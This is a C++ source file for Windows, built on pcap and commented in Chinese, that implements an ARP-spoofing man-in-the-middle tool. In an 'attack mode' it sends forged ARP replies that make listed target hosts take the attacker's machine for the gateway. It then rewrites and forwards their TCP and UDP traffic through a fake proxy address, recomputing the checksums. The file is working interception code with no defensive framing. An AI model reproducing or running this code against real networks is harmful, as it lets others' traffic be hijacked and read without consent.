﻿

#define WIN32_LEAN_AND_MEAN  // 减少不必要的头文件
#include <winsock2.h>
#include <windows.h>

#include <IPHlpApi.h>
#include "Utils.h"
#include "Packet.h"
#include "PacketProcess.h"
#include <map>
#include <unordered_map>  
#include "Public.h"
#include "ClientAddress.h"
#include "ArpCheat.h"
#include "connectionManager.h"
#include "config.h"
#include "nat.h"
#include "ArpCheat.h"

#pragma comment(lib,"iphlpapi.lib")

//1 query reply
//2 dhcp
//3 ip port replace
//4 

//netsh i i show in
//netsh -c "i i" add neighbors 21 192.168.21.1 b0-95-8e-50-9b-eb
//netsh -c "i i" delete neighbors 21


int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
{
	//NAT::init();

	pcap_pkthdr *				lpPcapHdr	= 0;
	const unsigned char *		lpPacket	= 0;

	LPTCPHEADER					lpTcp;
	LPUDPHEADER					lpUdp;
	unsigned short				srcPort;
	unsigned short				dstPort;
	unsigned short *			lpSubCheckSum;
	unsigned short *			lpDstPort;
	unsigned short *			lpSrcPort;
	int iRet = 0;

	while (TRUE)
	{
		iRet = pcap_next_ex(pcapt,&lpPcapHdr,&lpPacket);
		if (iRet == 0)
		{
			continue;
		}
		else if (iRet < 0)
		{
			char * lpError = pcap_geterr(pcapt);
			printf("%s line:%d error\n", __FUNCTION__, __LINE__);
			continue;
		}
		else if (lpPcapHdr->caplen != lpPcapHdr->len || lpPcapHdr->caplen >= MAX_PACKET_SIZE)
		{
			printf("%s line:%d error\n", __FUNCTION__, __LINE__);
			continue;
		}

		int iCapLen = lpPcapHdr->caplen;
		LPMACHEADER lpMac = (LPMACHEADER)lpPacket;

		if (lpMac->Protocol == 0x0608 ) {
			LPARPHEADER		ARPheader = (LPARPHEADER)((char*)lpMac + sizeof(MACHEADER));
			if (ARPheader->HardWareType == 0x0100 && ARPheader->ProtocolType == 0x0008 && 
				ARPheader->HardWareSize == MAC_ADDRESS_SIZE &&
				ARPheader->ProtocolSize == sizeof(unsigned long)  ) {

				unsigned int senderip = *(unsigned int *)ARPheader->SenderIP;
				unsigned int recverip = *(unsigned int *)ARPheader->RecverIP;

				if (ARPheader->Opcode == 0x0100  )
				{			
					if ((memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 || 
						memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
						/*(memcmp(ARPheader->RecverMac, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&*/ //recvermac可能为0
						recverip == gVirtualProxyIP )
					{
						//其他主机查询virtual ip的mac地址，返回虚拟网卡地址
						if (senderip && memcmp(ARPheader->SenderMac,ZERO_MAC_ADDRESS,MAC_ADDRESS_SIZE) != 0 )
						{
							iRet = ArpCheat::VirtualProxy(pcapt, senderip, ARPheader->SenderMac);
						}
					}
					else if ( (memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 || 
						memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
						(recverip == gGatewayIP) && 
						(memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE)== 0))
					{
						//任何一台主机查询网关ip的mac地址，如果在攻击列表中,给被查询者更新本地mac和ip
						//分两种，广播和非广播，非广播的目的mac是自己
						unsigned char * sendermac = ClientAddress::isTarget(senderip);
						if (sendermac && (gMode == ATTACK_MODE))
						{
							iRet = ArpCheat::EchoRARP(pcapt, gGatewayIP, gLocalMAC,senderip, ARPheader->SenderMac);
						}
					}					
					else if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 || 
						memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
						(recverip == gLocalIP) && 
						(memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0))
					{
						//任何主机查询自己，返回网络地址
						iRet = ArpCheat::EchoRARP(pcapt, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
					}
					else if ( (memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
						(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
						(memcmp(ARPheader->SenderMac, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
						(senderip == gGatewayIP) &&
						(memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) )
					{
						//网关查询所有主机,把本机MAC地址和所有被攻击IP绑定
						if (recverip == gLocalIP)
						{
							iRet = ArpCheat::EchoRARP(pcapt, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
						}
						else if (recverip == gVirtualProxyIP) {
							iRet = ArpCheat::EchoRARP(pcapt, recverip, gLocalMAC, senderip, ARPheader->SenderMac);
						}
						else {
							unsigned char * dstmac = ClientAddress::isTarget(recverip);
							if (dstmac) {
								iRet = ArpCheat::EchoRARP(pcapt, recverip, gLocalMAC, senderip, ARPheader->SenderMac);
							}
						}
					}
					//adjust self
// 					else if ( (memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 ||
// 						memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
// 						(memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
// 						(recverip == gGatewayIP || memcmp(ARPheader->RecverMac, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
// 						(senderip == gLocalIP || memcmp(ARPheader->SenderMac, gLocalMAC, MAC_ADDRESS_SIZE) == 0))
// 					{
// 						iRet = ArpCheat::adjustSelf(pcapt);
// 					}
				}
				else if (ARPheader->Opcode == 0x0200)
				{
					if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
						(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
						(gGatewayIP == senderip) &&
						memcmp(ARPheader->SenderMac, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) {
						//网关广播自己得地址，对每个被攻击者发送本地地址
						if (gMode == ATTACK_MODE) {
							iRet = ArpCheat::VirtualProxy(pcapt, gGatewayIP, gGatewayMAC);
							int cnt = gAttackTargetIP.size();
							for (int i = 0; i < cnt; i++)
							{
								if (gAttackTargetIP[i].clientIP == 0 ||
									memcmp(gAttackTargetIP[i].clientMAC, "\x00\x00\x00\x00\x00\x00", 6) == 0)
								{
									continue;
								}
								iRet = ArpCheat::FakeGateway(pcapt, gAttackTargetIP[i].clientIP, gAttackTargetIP[i].clientMAC);

								iRet = ArpCheat::VirtualProxy(pcapt, gAttackTargetIP[i].clientIP, gAttackTargetIP[i].clientMAC);
							}
						}
					}
					else {
						//iRet = Config::addTarget(gOnlineObjects, recverip, ARPheader->RecverMac);
					}
				}
			}
			continue;
		}
		else if (lpMac->Protocol != 0x0008 )
		{
			continue;
		}

		LPIPHEADER lpIPHdr = (LPIPHEADER)((char*)lpMac + sizeof(MACHEADER) );
		if (lpIPHdr->Version != 4)
		{
			continue;
		}

		int iIpHdrLen = (lpIPHdr->HeaderSize << 2);
		if (lpIPHdr->Protocol == IPPROTO_TCP)
		{
			lpTcp = (LPTCPHEADER)((char*)lpIPHdr + iIpHdrLen);
			lpSrcPort = &(lpTcp->SrcPort);
			srcPort = lpTcp->SrcPort;
			lpDstPort = &(lpTcp->DstPort);
			dstPort = lpTcp->DstPort;
			lpSubCheckSum = &lpTcp->PacketChksum;
		}
		else if (lpIPHdr->Protocol == IPPROTO_UDP)
		{
			lpUdp = (LPUDPHEADER)((char*)lpIPHdr + iIpHdrLen);
			lpSrcPort = &(lpUdp->SrcPort);
			srcPort = lpUdp->SrcPort;
			lpDstPort = &(lpUdp->DstPort);
			dstPort = lpUdp->DstPort;
			lpSubCheckSum = &lpUdp->PacketChksum;
		}
		else
		{
			continue;
		}

		unsigned char * lpCheckSumData = (unsigned char*)((char*)lpIPHdr + iIpHdrLen);
		unsigned int checkSumLen = iCapLen - (lpCheckSumData - lpPacket);
		unsigned short protocol = lpIPHdr->Protocol;

		
		if (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 && 
			memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 &&
			lpIPHdr->SrcIP == gLocalIP )
		{
			//arp attack cause self hijacked
			memmove(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE);
			iRet = pcap_sendpacket(pcapt, lpPacket, iCapLen);
			if (iRet)
			{
				printf("%s line:%d error\n", __FUNCTION__, __LINE__);
			}
 			continue;
		}
		else if ( (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) && 
			(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
			//caution here
			//(lpIPHdr->DstIP == gLocalIP)
			(lpIPHdr->DstIP == gVirtualProxyIP)
			)
		{
			
			CLIENTADDRESSES ca = ConnectionManager::get(dstPort,lpIPHdr->SrcIP, srcPort, protocol);
			if (ca.clientIP == 0 || memcmp(ca.clientMAC,ZERO_MAC_ADDRESS,MAC_ADDRESS_SIZE) == 0)
			{
				continue;
			}

			memmove(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE);
			memmove(lpMac->DstMAC, ca.clientMAC, MAC_ADDRESS_SIZE);
			lpIPHdr->DstIP = ca.clientIP;
			
			//modify here
// 			unsigned char dstmac[MAC_ADDRESS_SIZE];
// 			unsigned long dstip = 0;
// 			NAT::get(dstmac,dstip,dstPort, subProtocol);
// 			lpIPHdr->DstIP = dstip;
// 			*lpDstPort = dstPort;
// 			memmove(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE);
// 			memmove(lpMac->DstMAC, dstmac, MAC_ADDRESS_SIZE);
			//modify end

			lpIPHdr->HeaderChksum = 0;
			lpIPHdr->HeaderChksum = checksum((unsigned short*)lpIPHdr, iIpHdrLen);

			*lpSubCheckSum = 0;
			*lpSubCheckSum = subPackChecksum((char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, 
				lpIPHdr->DstIP, protocol);

			iRet = pcap_sendpacket(pcapt, lpPacket, iCapLen);
			if (iRet)
			{
				printf("SnifferHijack pcap_sendpacket error\r\n");
			}
			continue;
		}
		else if ((memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) && 
			((memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) != 0) && 
				(memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) != 0)) &&
			( ( (lpIPHdr->SrcIP & gNetMask) == gNetMaskIP) && (lpIPHdr->SrcIP != gLocalIP) && 
				(lpIPHdr->SrcIP != gGatewayIP)  ) )
		{
			
			CLIENTADDRESSES ca = { 0 };
			ca.clientIP = lpIPHdr->SrcIP;
			memmove(ca.clientMAC, lpMac->SrcMAC, MAC_ADDRESS_SIZE);
			ca.time = time(0);
			ca.clientPort = srcPort;
			iRet = ConnectionManager::put(lpIPHdr->SrcIP, srcPort, lpIPHdr->DstIP, dstPort, protocol, ca);
			
			//modify here
// 			unsigned char srcmac[MAC_ADDRESS_SIZE];
// 			memcpy(srcmac, lpMac->SrcMAC, MAC_ADDRESS_SIZE);
// 			unsigned long srcip = lpIPHdr->SrcIP;
// 			NAT::transfer(srcmac, srcip, srcPort, subProtocol);
// 			*lpSrcPort = srcPort;
			//modify end

			memmove(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE);
			memmove(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE);

			//here
			//lpIPHdr->SrcIP = gLocalIP;
			lpIPHdr->SrcIP = gVirtualProxyIP;

			lpIPHdr->HeaderChksum = 0;
			lpIPHdr->HeaderChksum = checksum((unsigned short*)lpIPHdr, iIpHdrLen);

			*lpSubCheckSum = 0;
			*lpSubCheckSum = subPackChecksum((char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, 
				lpIPHdr->DstIP, protocol);

			iRet = pcap_sendpacket(pcapt, lpPacket, iCapLen);
			if (iRet)
			{
				printf("SnifferHijack pcap_sendpacket error\r\n");
			}
			
			continue;
		}
// 		else if (memcmp(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0 && 
//			memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 &&
// 			lpIPHdr->SrcIP == gLocalIP)
// 		{
// 			continue;
// 		}
//		else {
// 			char log[1024];
// 			wsprintfA(log, "src mac:%x-%x-%x-%x-%x-%x,dst mac:%x-%x-%x-%x-%x-%x,src ip:%08x,dst ip:%08x\r\n",
// 				lpMac->SrcMAC[0], lpMac->SrcMAC[1], lpMac->SrcMAC[2], lpMac->SrcMAC[3], lpMac->SrcMAC[4], lpMac->SrcMAC[5],
// 				lpMac->DstMAC[0], lpMac->DstMAC[1], lpMac->DstMAC[2], lpMac->DstMAC[3], lpMac->DstMAC[4], lpMac->DstMAC[5],
// 				lpIPHdr->SrcIP, lpIPHdr->DstIP);
// 			printf(log);
//			continue;
//		}

		continue;
	}
	
	return TRUE;
}


WORD PacketProcess::checksum(WORD *buffer, int size)
{
	unsigned long cksum = 0;
	while (1 < size)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (0 < size)
		cksum += *(UCHAR*)buffer;
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return(unsigned short)(~cksum);
}



USHORT PacketProcess::subPackChecksum(char * lpCheckSumData, WORD wCheckSumSize, 
	DWORD dwSrcIP, DWORD dwDstIP, unsigned short wProtocol)
{
	char szCheckSumBuf[4096];
	LPCHECKSUMFAKEHEADER lpFakeHdr = (LPCHECKSUMFAKEHEADER)szCheckSumBuf;
	lpFakeHdr->dwSrcIP = dwSrcIP;
	lpFakeHdr->dwDstIP = dwDstIP;
	lpFakeHdr->Protocol = ntohs(wProtocol);
	lpFakeHdr->usLen = ntohs(wCheckSumSize);

	memmove(szCheckSumBuf + sizeof(CHECKSUMFAKEHEADER), (char*)lpCheckSumData, wCheckSumSize);

	*(DWORD*)(szCheckSumBuf + sizeof(CHECKSUMFAKEHEADER) + wCheckSumSize) = 0;

	unsigned short nCheckSum = checksum((WORD*)szCheckSumBuf, wCheckSumSize + sizeof(CHECKSUMFAKEHEADER));
	return nCheckSum;
}





#ifdef PORT_PROXY_VALUE
int getProxyPort(unsigned int ip) {
	for (unsigned int i = 0; i < gAttackTargetIP.size(); i++)
	{
		if (gAttackTargetIP[i].clientIP == ip)
		{
			return gAttackTargetIP[i].proxyPort;
		}
	}

	return 0;
}
#endif